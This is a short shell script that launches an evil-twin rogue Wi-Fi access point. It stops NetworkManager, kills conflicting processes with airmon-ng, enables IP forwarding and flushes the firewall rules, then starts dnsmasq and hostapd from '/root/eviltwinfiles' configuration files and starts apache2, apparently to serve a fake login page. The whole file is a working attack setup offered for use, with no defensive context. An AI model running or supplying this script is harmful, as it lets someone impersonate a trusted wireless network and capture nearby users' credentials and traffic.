#!/bin/sh
echo  "----------------------------\e[1;31m NetworkManager stopped \e[0m----------------------------"
systemctl stop NetworkManager

echo "----------------------------\e[1;31m Killing unnecessery prosseces \e[0m----------------------------"
airmon-ng check kill

echo "----------------------------\e[1;32m Setting ips and netmask \e[0m----------------------------"
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0
route add default gw 10.0.0.1

echo "----------------------------\e[1;32m Adding default getway to routing table \e[0m----------------------------"
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT

echo "----------------------------\e[1;32m Activating dnsmasq.conf \e[0m----------------------------"
dnsmasq -C /root/eviltwinfiles/dnsmasq.conf

echo "----------------------------\e[1;32m Activating hostapd.conf \e[0m----------------------------"
hostapd /root/eviltwinfiles/hostapd.conf -B

echo "----------------------------\e[1;32m Activating apache2 \e[0m----------------------------"
service apache2 start



